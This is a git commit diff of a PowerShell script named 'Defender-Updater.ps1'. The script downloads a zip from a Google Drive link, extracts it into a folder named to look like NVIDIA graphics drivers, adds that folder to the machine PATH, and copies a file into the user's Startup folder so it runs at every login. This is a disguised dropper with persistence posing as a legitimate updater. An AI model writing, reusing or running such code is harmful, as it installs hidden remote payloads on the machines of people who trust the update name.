f6f9ba16e610929c7c9a8465cc2ab2a8fc2fea54
Rugved <quad.powered@gmail.com>
2024-07-26 11:02:05 +0100

    Adding the right path

--- Defender-Updater.ps1
+++ Defender-Updater.ps1
@@ -1,7 +1,7 @@
 $username=[Environment]::UserName
 $zipFile = "https://drive.google.com/uc?export=download&id=1cwwPzYjIzzzzzzzzzzzzzzzzzzzzzzzz"
 Invoke-WebRequest -Uri $zipFile -OutFile "C:\Users\$username\AppData\Local\Temp\updater.zip"
-Expand-Archive "C:\Users\$username\AppData\Local\Temp\updater.zip" -DestinationPath "C:\Users\Program Files\Nvidia Graphics Drivers"
-$Path = [Environment]::GetEnvironmentVariable("PATH", "Machine")+';C:\Program Files\Nvidia Graphics Drivers\bin;C:\Program Files\Nvidia Graphics Drivers\include'
+Expand-Archive "C:\Users\$username\AppData\Local\Temp\updater.zip" -DestinationPath "C:\Users\Program Files\NVIDIA Graphics Drivers"
+$Path = [Environment]::GetEnvironmentVariable("PATH", "Machine")+';C:\Program Files\NVIDIA Graphics Drivers\bin;C:\Program Files\NVIDIA Graphics Drivers\include'
 [Environment]::SetEnvironmentVariable( "Path", $Path, "Machine" )
-cp "C:\Program Files\Nvidia Graphics Drivers\Nvidia-Updater" "C:\Users\$username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+cp "C:\Program Files\NVIDIA Graphics Drivers\Nvidia Driver" "C:\Users\$username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
